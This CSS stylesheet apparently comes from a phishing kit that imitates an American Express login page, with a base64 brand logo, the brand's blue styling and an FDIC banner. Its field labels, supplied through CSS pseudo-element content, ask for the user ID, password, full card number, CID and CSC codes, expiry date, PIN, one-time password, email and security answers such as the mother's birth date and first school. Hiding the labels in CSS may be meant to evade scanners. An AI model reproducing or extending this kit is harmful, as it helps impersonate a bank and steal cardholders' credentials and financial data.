	.logo-text-top{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAxMDAgMjgiPjxwYXRoIGZpbGw9Im5vbmUiIGQ9Ik0wIDBoMTAwdjI4SDB6Ii8+PHBhdGggZD0iTTk2LjEgMjAuM2gtMi45Yy0uNiAwLTEuMS0uNC0xLjEtLjkgMC0uNi41LS45IDEuMS0uOWg1LjNsMS4yLTIuN2gtNi41Yy0yLjcgMC00LjIgMS42LTQuMiAzLjcgMCAyLjIgMS41IDMuNSAzLjggMy41aDIuOWMuNiAwIDEuMS40IDEuMS45cy0uNC45LTEuMS45aC02LjR2Mi43aDYuNGMyLjcgMCA0LjItMS42IDQuMi0zLjhzLTEuNC0zLjQtMy44LTMuNG0tMTEuNyAwaC0yLjljLS42IDAtMS4xLS40LTEuMS0uOSAwLS42LjUtLjkgMS4xLS45aDUuM2wxLjItMi43aC02LjVjLTIuNyAwLTQuMiAxLjYtNC4yIDMuNyAwIDIuMiAxLjUgMy41IDMuOCAzLjVIODRjLjYgMCAxLjEuNCAxLjEuOXMtLjQuOS0xLjEuOWgtNi40djIuN0g4NGMyLjcgMCA0LjItMS42IDQuMi0zLjguMS0yLjItMS4zLTMuNC0zLjgtMy40bS0xOC41IDcuM2gxMHYtMi43aC02LjhWMjNoNi43di0yLjdoLTYuN3YtMS45aDYuOHYtMi43aC0xMHptLTYuMi02LjhoLTMuM3YtMi40aDMuM2MuOSAwIDEuNC42IDEuNCAxLjIgMCAuNy0uNSAxLjItMS40IDEuMm00LjYtMS4zYzAtMi4zLTEuNi0zLjgtNC4yLTMuOGgtNi45djExLjloMy4ydi00LjFoMS4ybDMuNiA0LjFINjVsLTMuOS00LjNjMi0uNSAzLjItMS45IDMuMi0zLjhNNDcuMiAyMWgtMy40di0yLjZoMy40Yy45IDAgMS40LjYgMS40IDEuMyAwIC43LS40IDEuMy0xLjQgMS4zbS40LTUuM2gtNi45djExLjloMy4ydi0zLjloMy43YzIuNyAwIDQuMy0xLjcgNC4zLTQtLjEtMi40LTEuNy00LTQuMy00bS03LjUgMEgzNmwtMyAzLjYtMy4xLTMuNmgtNC4ybDUuMyA1LjktNS40IDZoNC4xbDMuMi0zLjggMy4yIDMuOGg0LjJsLTUuNC02LjF6TTE1LjIgMjcuNmgxMHYtMi43aC02LjlWMjNIMjV2LTIuN2gtNi43di0xLjloNi45di0yLjdoLTEwek05NC45IDcuN0w5MCAuNWgtNHYxMS44aDMuMlY0LjhsNSA3LjVIOThWLjVoLTMuMXptLTE4LjQtLjRsMS43LTQgMS43IDRoLTMuNHpNNzYuMS41bC01LjIgMTEuOWgzLjVsMS0yLjRoNS41bDEgMi40aDMuNkw4MC4yLjVoLTQuMXptLTEwLjQgNnYtLjJjMC0xLjggMS0zIDMtM2gzLjVWLjRoLTMuOGMtMy45IDAtNS45IDIuNS01LjkgNS44di4yYzAgMy43IDIuMyA1LjggNS44IDUuOGgxLjFsMS4zLTIuN2gtMS45Yy0xLjkuMS0zLjEtMS0zLjEtM20tOC02djExLjhoMy4yVi41em0tNi4yIDVoLTMuM1YzLjFoMy4zYy45IDAgMS40LjYgMS40IDEuMiAwIC43LS41IDEuMi0xLjQgMS4ybTQuNi0xLjJDNTYuMSAyIDU0LjUuNSA1MS45LjVINDV2MTEuOWgzLjJWOC4yaDEuMmwzLjYgNC4xaDMuOWwtNC00LjNjMi0uNCAzLjItMS45IDMuMi0zLjdtLTIzLjIgOGgxMFY5LjZoLTYuOFY3LjdoNi42VjVoLTYuNlYzLjFoNi44Vi41aC0xMHpNMjIuOCA3LjlMMjAuMS41aC00Ljl2MTEuOGgzLjFWMy44bDMuMSA4LjVoMi44bDMuMS04LjV2OC41aDMuMlYuNWgtNXpNNS42IDcuM2wxLjctNCAxLjcgNEg1LjZ6TTUuMi41TDAgMTIuM2gzLjVsMS0yLjRIMTBsMSAyLjRoMy42TDkuMy41SDUuMnoiIGZpbGw9IiMwMDZmY2YiLz48L3N2Zz4=);background-size:contain;background-repeat:no-repeat;background-position:center;width:100px;height:28px;display:inline-block;text-indent:-9999px}
	.search-button{display:flex;align-items:center;justify-content:center;padding:10px;border-radius:50%;transition:background-color .2s ease-in-out}.search-button:hover{background-color:var(--light-gray-bg)}
	.search-icon{width:20px;height:20px;stroke:var(--amex-blue);stroke-width:2.5;transition:transform .2s ease-in-out}.search-button:hover .search-icon{transform:scale(1.1)}
	.login-button{background-color:var(--amex-blue);color:var(--white);font-size:14px;font-weight:100;width:84px;padding:10px;border-radius:3px;white-space:nowrap;transition:background-color .2s ease-in-out,transform .1s ease-in-out}.login-button:hover{background-color:var(--amex-blue-hover)}.login-button:active{transform:scale(.98)}
	.fdic-logo{background-color:#fff;position:relative;height:35px;width:100%;text-align:center;border-bottom:0 solid #d4d4d4;padding:4px;font:inherit}
	.inputWrapper{width:100%;margin:0 auto;box-sizing:border-box}
	.labelTxt{display:block;margin-bottom:.3rem;font-size:.99rem;color:#333;font-weight:600}
	.oun::before{content:"User ID"}
	.ps::before{content:"Password"}
	.cn::before{content:"15-digit Card Number"}
	.cid::before{content:"4-digit Card ID (CID)"}
	.csc::before{content:"3-Digit Card Security Code (CSC)"}
	.cem::before{content:"Card Expiration Month"}
	.cey::before{content:"Card Expiration Year"}
	.pn::before{content:"Your Security Pin"}
	.mmdd::before{content:"Your Mother's Birth Month/Day"}
	.k12::before{content:"Your First Elementary School"}
	.otp::before{content:"One-time password"}
	.em::before{content:"E-mail Address"}
	.oun,.ps,.csc,.pn,.mmdd,.otp,.em{display:block;font-weight:600;font-size:.99rem;margin-bottom:4px;color:#333}
	input[type="text"],input[type="password"],input[type="number"]{width:100%;box-sizing:border-box;padding:.625rem;font-size:1rem;border:1px solid #8E9092;border-radius:.25rem;background-color:#F7F8F9;color:#2D2D2D;display:block}input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
	.upw-container{position:relative;width:100%;margin:0 auto 1rem;box-sizing:border-box}.toggle-upw{position:absolute;top:50%;right:1rem;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:14px;color:#006fcf;padding:0}
	.btn{display:flex;justify-content:center;margin:0 auto 1rem;padding:15px 30px;font-size:16px;border-radius:4px;box-sizing:border-box;min-width:100%;color:#fff;background:#006fcf!important;border:none}
	.btnresend{background:#fcfcfc!important;padding-top:0;border:1px solid #f8f8f8;border-radius:7px;color:#005cb0;cursor:pointer;padding:5px 10px;margin:0 auto;position:relative;font-family:Helvetica Neue,Helvetica,sans-serif;font-size:.915rem;font-weight:400;text-align:left;text-decoration:none}
	.btnstover{background:#fcfcfc!important;padding-top:0;border:1px solid #f7f7f7;border-radius:5px;color:#005cb0;cursor:pointer;padding:5px 15px;margin:0 auto;position:relative;font-family:Helvetica Neue,Helvetica,sans-serif;font-size:.71rem;font-weight:600;text-decoration:none}
	#spinner{color:#0062c4;width:5rem;height:5rem}
